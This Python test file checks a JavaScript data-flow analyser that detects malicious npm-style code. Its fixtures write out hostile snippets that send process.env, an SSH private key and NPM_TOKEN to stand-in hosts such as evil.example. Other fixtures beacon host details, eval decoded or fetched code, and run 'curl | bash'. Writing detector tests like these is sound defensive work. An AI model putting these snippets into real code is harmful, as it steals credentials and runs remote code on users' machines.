"""JS data-flow analysis: connected source->sink evidence, not pattern co-occurrence."""

import pytest

from slopwatch.assessor import js_ast

pytestmark = pytest.mark.skipif(not js_ast.available(), reason="tree-sitter not installed (slopwatch[js])")


def flows(src):
    rep = js_ast.analyze_js_source(src, "index.js")
    assert rep.analysed
    return rep.flag_prefixes


@pytest.mark.parametrize("src,expected", [
    # env stealer via request handle
    ("""const https=require('https'); const d=JSON.stringify(process.env);
        const req=https.request({hostname:'x.example',method:'POST'}); req.write(d); req.end();""",
     "JS_DATAFLOW_SECRET_EXFIL"),
    # credential file straight into fetch body
    ("""const fs=require('fs'); const k=fs.readFileSync(require('os').homedir()+'/.ssh/id_rsa','utf8');
        fetch('https://evil.example/c',{method:'POST',body:k});""",
     "JS_DATAFLOW_SECRET_EXFIL"),
    # foreign CI token to an unknown host
    ("""const t = process.env.NPM_TOKEN; axios.post('https://collector.example/t', {t});""",
     "JS_DATAFLOW_SECRET_EXFIL"),
    # dependency-confusion beacon
    ("""const os=require('os'); const data={h:os.hostname(),u:os.userInfo().username,d:__dirname};
        https.get('https://x.oast.example/?'+querystring.stringify(data));""",
     "JS_DATAFLOW_HOST_RECON_BEACON"),
    # DNS exfil of hostname
    ("""const dns=require('dns'); const h=Buffer.from(os.hostname()).toString('hex'); dns.lookup(h+'.x.example', ()=>{});""",
     "JS_DATAFLOW_HOST_RECON_BEACON"),
    # base64 -> eval, two hops
    ("""const p=Buffer.from('ZXZhbCgxKQ==','base64'); const s=p.toString(); eval(s);""",
     "JS_DATAFLOW_DECODE_TO_EXEC"),
    ("""new Function(atob(payload))();""", "JS_DATAFLOW_DECODE_TO_EXEC"),
    # fetched code executed
    ("""(async()=>{const r=await fetch(u); const code=await r.text(); eval(code);})();""",
     "JS_DATAFLOW_REMOTE_CODE_EXEC"),
    # shell download cradle
    ("""const {exec}=require('child_process'); exec('curl -s http://x.example/a.sh | bash');""",
     "JS_SHELL_DOWNLOAD_CRADLE"),
])
def test_malicious_shapes(src, expected):
    assert expected in flows(src)


@pytest.mark.parametrize("src", [
    # JWT decode + API call: decode and network co-occur, nothing connects them to exec/exfil
    """const claims=JSON.parse(atob(jwt.split('.')[1])); fetch(api,{headers:{Authorization:'Bearer '+key}});""",
    # SDK sending its own API key to its own API
    """fetch('https://api.openai.com/v1/x',{headers:{Authorization:'Bearer '+process.env.OPENAI_API_KEY}});""",
    # NODE_ENV in telemetry
    """fetch(url,{method:'POST',body:JSON.stringify({env:process.env.NODE_ENV})});""",
    # publish tooling sending NPM_TOKEN to the registry
    """fetch('https://registry.npmjs.org/-/whoami',{headers:{authorization:'Bearer '+process.env.NPM_TOKEN}});""",
    # spawning a child with the inherited environment
    """const {spawn}=require('child_process'); spawn('node',['x.js'],{env:{...process.env,FOO:'1'}});""",
    # eval of a constant
    """eval('1+1'); fetch('/x');""",
])
def test_benign_shapes(src):
    assert flows(src) == set()


def test_oversized_file_is_not_analysed():
    assert js_ast.analyze_js_source("var a=1;" * 200_000, "big.js").analysed is False


@pytest.mark.parametrize("src", [
    # minifier reuse: `t` is a fetch result in one function, an unrelated parameter in another
    "function a(u){var t=fetch(u);return t}function b(t){return Function(t)()}",
    # `e` decoded in one function, a constant in a sibling
    "function c(x){var e=atob(x);return e}function d(){var e='1+1';return eval(e)}",
    # shadowed by an inner arrow parameter
    "var t=atob(p);[1].map(t=>eval(t));",
])
def test_minified_name_reuse_does_not_connect_scopes(src):
    assert flows(src) == set()


def test_outer_variable_still_reaches_inner_sink():
    assert "JS_DATAFLOW_DECODE_TO_EXEC" in flows("var s=atob(p);function run(){eval(s)}run();")
